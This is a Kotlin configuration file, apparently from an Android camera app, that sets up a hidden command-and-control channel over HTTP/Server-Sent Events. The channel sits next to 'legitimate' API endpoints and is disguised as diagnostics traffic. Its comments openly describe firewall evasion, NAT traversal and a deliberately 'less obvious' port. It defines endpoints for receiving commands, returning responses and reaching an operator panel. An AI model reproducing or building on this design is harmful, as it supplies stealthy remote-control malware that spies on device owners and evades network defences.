package com.example.owlcamapp.util

/**
 * API and C2 endpoints configuration.
 *
 * HTTP/SSE ARCHITECTURE:
 * The C2 system now operates over HTTP with Server-Sent Events (SSE) instead of
 * native TCP connections. This allows:
 * - Firewall evasion (standard HTTP traffic)
 * - Automatic NAT traversal (works on 4G/5G and corporate networks)
 * - Persistent connections without non-standard ports
 *
 * C2 connection flow:
 * 1. Validate token at /api/v2/diag/validate
 * 2. Establish SSE connection to C2_SSE_ENDPOINT
 * 3. Listen for 'cmd' events from the server
 * 4. Send responses via POST to C2_RESPONSE_ENDPOINT
 */
object ApiConfig {
    // Base URL of the legitimate API
    const val BASE_URL = "http://10.0.2.2:5000"
    
    // C2 server URL (HTTP/SSE) - Port 4999 (less obvious)
    // On Android emulator, 10.0.2.2 points to the local host
    const val C2_SERVER_URL = "http://10.0.2.2:4999"
    
    // C2 host and port for legacy code compatibility (DiagSysService.kt)
    // C2 now uses HTTP/SSE instead of native TCP
    val C2_HOST: String
        get() = C2_SERVER_URL.replace("http://", "")
                           .replace("https://", "")
                           .split(":")[0]
    const val C2_PORT = 4999
    
    // Headers for device identification in C2
    const val HEADER_DEVICE_ID = "X-Device-ID"
    const val HEADER_DIAG_TOKEN = "X-Diag-Token"
    const val HEADER_DEVICE_MODEL = "X-Device-Model"
    
    // Legitimate API endpoints
    const val ENDPOINT_SUPPORT = "/api/support/submit"
    const val ENDPOINT_DIAG_VALIDATE = "/api/v2/diag/validate"
    const val ENDPOINT_DIAG_METRICS = "/api/v2/metrics/diagnostic"
    
    // C2 endpoints (HTTP/SSE)
    const val C2_SSE_ENDPOINT = "$C2_SERVER_URL/stream"
    const val C2_RESPONSE_ENDPOINT = "$C2_SERVER_URL/response"
    const val C2_METRICS_ENDPOINT = "$C2_SERVER_URL/metrics"
    const val C2_PANEL_URL = "$C2_SERVER_URL/panel"
    
    const val DIAG_VERSION = "2.4.1-SSE"
}
